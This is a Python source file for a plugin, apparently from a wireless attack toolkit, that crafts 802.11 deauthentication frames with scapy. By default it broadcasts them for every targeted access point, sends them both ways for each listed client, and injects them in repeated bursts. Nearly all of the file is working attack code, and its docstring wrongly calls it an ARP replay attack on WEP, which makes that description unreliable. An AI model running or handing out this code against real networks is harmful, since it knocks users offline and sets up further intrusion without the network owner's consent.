# -*- coding: utf-8 -*-
"""
This plugin will launch a full arp replay attack on a WEP network
"""

import os, traceback
from plugin import AirInjectorPlugin
from utils.wifiutils import AccessPoint, WiFiClient
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
from textwrap import dedent
from threading import Thread
from socket import error as socket_error


class Deauthenticator(AirInjectorPlugin):

    def __init__(self):
        super(Deauthenticator, self).__init__("deauthenticator")
        try:
            self._burst_count   = int(self.config["burst_count"])
            self._targeted_only = self.config["targeted_only"].lower() == "true"
        except:
            self._burst_count   = 5
            self._targeted_only = False

    def _find_bssid(self, ssid, ap_targets):
        for ap in ap_targets:
            if ap.ssid == ssid:
                return ap.bssid
        return None

    def interpret_targets(self, ap_targets, client_targets):
        if not self._targeted_only:
            for access_point in ap_targets:
                deauth_packet = RadioTap() / \
                                Dot11(type=0,subtype=12,    addr1="FF:FF:FF:FF:FF:FF", \
                                                            addr2=access_point.bssid, \
                                                            addr3=access_point.bssid) / \
                                Dot11Deauth(reason=7)

                self.packets.add(deauth_packet)

        for client in client_targets:
            mac = client.client_mac
            bssid = client.associated_bssid

            if bssid == None:
                continue

            deauth_packet1 =    RadioTap() / \
                                Dot11(type=0,subtype=12, addr1=bssid, addr2=mac, addr3=mac) / \
                                Dot11Deauth(reason=7)
            deauth_packet2 =    RadioTap() / \
                                Dot11(type=0,subtype=12, addr1=mac, addr2=bssid, addr3=bssid) / \
                                Dot11Deauth(reason=7)

            self.packets.add(deauth_packet1)
            self.packets.add(deauth_packet2)

    def inject_packets(self):
        count = self._burst_count if self._burst_count > 0 else 5

        print dedent("[+] Starting deauthentication attack \n\
                    - {nburst} bursts of 1 packets \n\
                    - {npackets} different packets").format( nburst=self._burst_count,
                                                             npackets=len(self.packets))
        try:
            while count >= 0 and not self.should_stop:
                for packet in self.packets:
                    self.injection_socket.send(packet)
                    
                count -= 1
        except socket_error as e:
            if not e.errno == 100:
                print e
                traceback.print_exc()
        except Exception as e:
            print "Exception: {}".format(e)
            print "[-] Stopping deauthentication attack."
